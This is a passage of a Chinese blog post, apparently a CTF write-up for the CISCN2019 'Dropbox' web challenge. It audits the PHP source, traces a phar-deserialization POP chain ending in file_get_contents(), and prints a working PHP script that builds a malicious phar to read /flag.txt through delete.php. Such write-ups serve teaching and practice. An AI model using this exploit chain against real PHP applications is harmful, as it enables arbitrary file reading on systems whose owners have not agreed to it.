class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计代码：</p>
+<p>index.php中，$a是一个FileList对象，并且调用了Name()，Size()方法，然而class.php中的FileList类并没有这两个方法，同时又有__call()方法，这里就存在一个反序列化的利用点</p>
+<p>跟进__call()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$func的值为调用的”不存在的方法“，该__call()方法功能就是对每个文件都调用$func所代表的方法，在该类的构造函数中可以看到$this-&gt;files中的元素都是File类的对象，进入File类</p>
+<p>File类中有close()方法，跟进它</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>file_get_contents()</code>方法，该方法会读取$this-&gt;filename所代表文件的所有内容，可以用来实现任意文件读取</p>
+<p>pop链大致已经出来了，让一个FileList对象调用close方法，来触发__call方法，从而触发File对象的close方法进行任意文件读取，现在还要解决的一个问题就是，如何让一个FileList对象去调用close方法，全局搜索close，可以在User类中找到它的析构函数，跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$this-&gt;db可控，这里就是反序列化的起点</p>
+<p>下面构造exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files   = [<span class="keyword">new</span> File(<span class="string">&quot;/flag.txt&quot;</span>)];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs   = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行脚本生成phar文件，改后缀上传</p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124145611612.png" alt="image-20220124145611612"></p>
+<p>这里还有最后一个点，就是上面提到的download.php会把含有字符串<code>flag</code>的文件都过滤掉，用下载方法的话是看不到flag文件的，整个页面还剩下最后一个删除功能没有使用，先查看delete.php的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和download.php一对比就发现delete.php中少了对<code>flag</code>的过滤，所以最后我们要用删除来查看flag，抓包，修改文件名，发送报文即可得到flag</p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124150525009.png" alt="image-20220124150525009"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>wuyusanhua
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/" title="CISCN2019华北赛区Day1Web1-Dropbox">https://wuyusanhua2021.github.io/2022/01/23/CISCN2019华北赛区Day1Web1-Dropbox/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+        
+      </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/23/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-AliceWebsite/" rel="prev" title="CISCN2019华北赛区Day1Web1-Dropbox">
+      <i class="fa fa-chevron-left"></i> CISCN2019华北赛区Day1Web1-Dropbox
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wuyusanhua"
+      src="/images/sakuya.png">
+  <p class="site-author-name" itemprop="name">wuyusanhua</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">雾雨散花</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">66k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:01</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
